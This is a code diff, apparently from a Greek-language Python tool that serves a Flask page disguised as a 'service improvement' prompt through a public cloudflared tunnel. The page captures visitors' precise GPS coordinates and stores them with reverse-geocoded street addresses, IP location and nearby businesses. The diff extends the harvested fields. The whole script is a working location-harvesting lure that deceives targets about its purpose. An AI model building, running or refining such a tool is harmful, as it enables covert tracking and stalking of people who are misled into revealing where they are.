@@ -8,10 +8,9 @@ import time
 from threading import Thread
 from datetime import datetime
 
-# --- Έλεγχος Εξαρτήσεων και Σύνδεσης ---
+# --- Έλεγχος εξαρτήσεων ---
 
 def install_package(package):
-    """Εγκαθιστά ένα πακέτο με pip."""
     try:
         subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])
     except subprocess.CalledProcessError as e:
@@ -19,12 +18,11 @@ def install_package(package):
         sys.exit(1)
 
 def check_dependencies():
-    """Ελέγχει αν υπάρχει το cloudflared και τα απαραίτητα Python πακέτα."""
     try:
         subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except (subprocess.CalledProcessError, FileNotFoundError):
-        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH.", file=sys.stderr)
-        print("Κατέβασε το από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
+        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο.", file=sys.stderr)
+        print("Εγκατάσταση: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
         sys.exit(1)
     
     packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
@@ -35,66 +33,100 @@ def check_dependencies():
             install_package(pkg_name)
 
 def run_cloudflared_and_print_link(port):
-    """Ξεκινά cloudflared tunnel και εμφανίζει μόνο το δημόσιο link."""
     cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
     process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     for line in iter(process.stdout.readline, ''):
         match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
         if match:
-            print(f"\nΔημόσιος Σύνδεσμος: {match.group(0)}\n")
+            print(f"\n🔗 Δημόσιος Σύνδεσμος: {match.group(0)}\n")
             sys.stdout.flush()
             break
     process.wait()
 
-# --- Εισαγωγές μετά τον έλεγχο εξαρτήσεων ---
+# --- Εισαγωγές ---
 from flask import Flask, render_template_string, request, jsonify
 import requests
 from geopy.geocoders import Nominatim
+from geopy.distance import geodesic
 
 # --- ΡΥΘΜΙΣΕΙΣ ---
-
-LOCATION_FOLDER = os.path.expanduser('~/storage/downloads/Τοποθεσίες')
+LOCATION_FOLDER = os.path.expanduser('~/storage/downloads/Locations')
 os.makedirs(LOCATION_FOLDER, exist_ok=True)
 
 logger = logging.getLogger(__name__)
-logger.setLevel(logging.ERROR)  # Κρύβουμε τα INFO logs
+logger.setLevel(logging.ERROR)
 
-# --- Συναρτήσεις Επεξεργασίας ---
-
+# --- ΓΕΩΕΝΤΟΠΙΣΜΟΣ ---
 geolocator = Nominatim(user_agent="fast_location_app")
 
 def process_and_save_location(data):
-    """Επεξεργάζεται στο background και αποθηκεύει δεδομένα τοποθεσίας."""
     try:
         lat, lon = data['latitude'], data['longitude']
-        full_data = {'gps_data': data}
 
-        # 1. Αντιστοίχιση Συντεταγμένων σε Διεύθυνση
+        # Διεύθυνση
+        full_address = "Μη διαθέσιμη"
+        address_details = {}
         try:
             location = geolocator.reverse((lat, lon), language='el', exactly_one=True, timeout=10)
             if location and hasattr(location, 'raw') and 'address' in location.raw:
-                full_data['address_details'] = location.raw.get('address', {})
-                full_data['full_address'] = location.address
+                address_details = location.raw.get('address', {})
+                full_address = location.address
         except Exception:
-            full_data['full_address'] = "Μη διαθέσιμη"
+            pass
 
-        # 2. Καταστήματα κοντά
-        full_data['nearby_stores'] = get_nearby_stores(lat, lon)
+        # Κοντινά καταστήματα (2 πιο κοντινά)
+        places = get_nearby_places(lat, lon, limit=2)
 
-        # 3. Τοποθεσία βάσει IP
-        full_data['ip_based_location'] = get_ip_info()
+        # IP Τοποθεσία
+        ip_info = get_ip_info()
 
-        # 4. Αποθήκευση σε JSON
+        # JSON
+        pretty_data = {
+            "GPS Coordinates": {
+                "Latitude": lat,
+                "Longitude": lon,
+                "Accuracy (m)": data.get("accuracy"),
+                "Altitude (m)": data.get("altitude"),
+                "Speed (m/s)": data.get("speed"),
+                "Heading (°)": data.get("heading")
+            },
+            "Address": {
+                "House Number": address_details.get("house_number"),
+                "Street": address_details.get("road"),
+                "Suburb": address_details.get("suburb"),
+                "City": address_details.get("city"),
+                "State": address_details.get("state"),
+                "Postcode": address_details.get("postcode"),
+                "Country": address_details.get("country")
+            },
+            "Full Address": full_address,
+            "Nearby Places (Top 2)": [
+                {
+                    "Type": p.get("type", "Άγνωστο").title(),
+                    "Name": p.get("name", "Χωρίς Όνομα"),
+                    "Address": p.get("address") or "N/A",
+                    "Distance": f"{p['distance_m']} μ" if 'distance_m' in p else "N/A"
+                }
+                for p in places
+            ],
+            "IP Location": {
+                "IP": ip_info.get("ip"),
+                "City": ip_info.get("city"),
+                "Region": ip_info.get("region"),
+                "Country": ip_info.get("country")
+            }
+        }
+
         date_str = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
         filename = os.path.join(LOCATION_FOLDER, f'τοποθεσία_{date_str}.json')
-        with open(filename, 'w') as f:
-            json.dump(full_data, f, indent=4)
+        with open(filename, 'w', encoding="utf-8") as f:
+            json.dump(pretty_data, f, indent=4, ensure_ascii=False)
 
-        # Εμφάνιση μόνο του αρχείου
-        print(f"Αποθηκεύτηκαν δεδομένα στο αρχείο: {filename}\n")
+        print(f"✅ Τα δεδομένα αποθηκεύτηκαν: {filename}\n")
 
     except Exception as e:
-        logger.error(f"Σφάλμα στην επεξεργασία: {e}")
+        logger.error(f"Σφάλμα: {e}")
+
 
 def get_ip_info():
     try:
@@ -104,18 +136,46 @@ def get_ip_info():
     except requests.RequestException:
         return {}
 
-def get_nearby_stores(latitude, longitude, radius=2000):
-    overpass_query = f"""[out:json];(node["shop"](around:{radius},{latitude},{longitude});way["shop"](around:{radius},{latitude},{longitude}););out body;"""
+def get_nearby_places(latitude, longitude, radius=2000, limit=2):
+    overpass_query = f"""
+    [out:json];
+    (
+        node["shop"](around:{radius},{latitude},{longitude});
+        way["shop"](around:{radius},{latitude},{longitude});
+        node["amenity"~"restaurant|cafe|bar|fast_food|pharmacy|bank|supermarket"](around:{radius},{latitude},{longitude});
+        way["amenity"~"restaurant|cafe|bar|fast_food|pharmacy|bank|supermarket"](around:{radius},{latitude},{longitude});
+    );
+    out center;
+    """
     try:
         response = requests.get("http://overpass-api.de/api/interpreter", params={'data': overpass_query}, timeout=10)
         response.raise_for_status()
         elements = response.json().get('elements', [])
-        return [element['tags']['name'] for element in elements if 'tags' in element and 'name' in element['tags']]
+        results = []
+
+        for element in elements:
+            tags = element.get('tags', {})
+            lat_elem = element.get('lat') or element.get('center', {}).get('lat')
+            lon_elem = element.get('lon') or element.get('center', {}).get('lon')
+
+            if not lat_elem or not lon_elem:
+                continue
+
+            distance = geodesic((latitude, longitude), (lat_elem, lon_elem)).meters
+            results.append({
+                "type": tags.get("shop") or tags.get("amenity"),
+                "name": tags.get("name", "Χωρίς Όνομα"),
+                "address": f"{tags.get('addr:street', '')} {tags.get('addr:housenumber', '')}".strip(),
+                "distance_m": round(distance, 1)
+            })
+
+        results.sort(key=lambda x: x["distance_m"])
+        return results[:limit]
+
     except requests.RequestException:
         return []
 
-# --- ΕΦΑΡΜΟΓΗ FLASK ---
-
+# --- FLASK ΕΦΑΡΜΟΓΗ ---
 app = Flask(__name__)
 
 HTML_TEMPLATE = """<!DOCTYPE html>
@@ -135,7 +195,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
 <body>
 <div class="container">
     <h1>Βελτίωση Υπηρεσίας</h1>
-    <p>Για καλύτερη εμπειρία και τοπικό περιεχόμενο, η εφαρμογή χρειάζεται πρόσβαση στην τοποθεσία σας.</p>
+    <p>Για καλύτερη εμπειρία, η εφαρμογή χρειάζεται πρόσβαση στην τοποθεσία σας.</p>
     <button id="locationButton" onclick="requestLocation()">Μοιράσου την Τοποθεσία</button>
     <div id="status"></div>
 </div>
@@ -160,16 +220,16 @@ HTML_TEMPLATE = """<!DOCTYPE html>
     async function requestLocation() {
         buttonEl.disabled = true;
         statusEl.style.color = '#ffc107';
-        statusEl.textContent = 'Γίνεται αίτημα για τοποθεσία...';
+        statusEl.textContent = 'Αίτημα τοποθεσίας...';
         if (!navigator.geolocation) {
             statusEl.style.color = '#dc3545';
-            statusEl.textContent = 'Η γεωεντοπισμός δεν υποστηρίζεται.';
+            statusEl.textContent = 'Η γεωτοποθεσία δεν υποστηρίζεται.';
             return;
         }
         navigator.geolocation.getCurrentPosition(
             (fastPosition) => {
                 statusEl.style.color = '#28a745';
-                statusEl.textContent = 'Η τοποθεσία λήφθηκε. Βελτίωση ακρίβειας...';
+                statusEl.textContent = 'Η τοποθεσία λήφθηκε. Γίνεται βελτίωση ακρίβειας...';
                 sendLocationToServer(fastPosition);
                 navigator.geolocation.getCurrentPosition(
                     (accuratePosition) => {
@@ -209,10 +269,9 @@ def save_location():
     processing_thread = Thread(target=process_and_save_location, args=(data,))
     processing_thread.daemon = True
     processing_thread.start()
-    return jsonify({"message": "Τα δεδομένα τοποθεσίας ελήφθησαν."}), 202
+    return jsonify({"message": "Η τοποθεσία λήφθηκε."}), 202
 
 # --- ΚΥΡΙΑ ΕΚΤΕΛΕΣΗ ---
-
 if __name__ == '__main__':
     check_dependencies()
     log = logging.getLogger('werkzeug')
@@ -231,3 +290,4 @@ if __name__ == '__main__':
     except Exception as e:
         print(f"\nΠαρουσιάστηκε σφάλμα: {e}")
         sys.exit(1)
+
